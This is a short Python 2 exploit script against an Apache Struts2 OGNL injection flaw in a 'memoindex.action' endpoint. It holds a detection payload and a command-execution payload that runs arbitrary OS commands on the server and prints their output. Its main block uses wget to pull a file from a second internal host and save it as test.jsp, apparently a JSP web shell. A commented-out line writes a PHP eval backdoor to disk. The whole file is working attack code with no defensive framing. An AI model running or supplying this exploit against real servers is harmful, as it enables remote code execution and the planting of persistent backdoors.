# coding:utf-8
import requests

poc = '''{}/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10086'''
url = poc.format('http://192.168.40.26:8082')
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'}
exp = '''{}/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd={}'''


def ispoc():
    res = requests.get(headers=headers, url=url)
    data = res.content
    if data == '1008660253718':
        return True
    else:
        return False

def explit(url, cmd):
    nurl = exp.format(url, cmd)
    res = requests.get(headers=headers, url=nurl)
    print res.content




if __name__ == '__main__':
    url = 'http://192.168.40.26:8082'
    # cmd = '''echo "<?php @eval($_POST[__RANDPASS__]); ?>" > /home/swm.sw'''
    cmd = ''' wget http://172.22.209.33:8014/api/download -O test.jsp'''
    explit(url, cmd)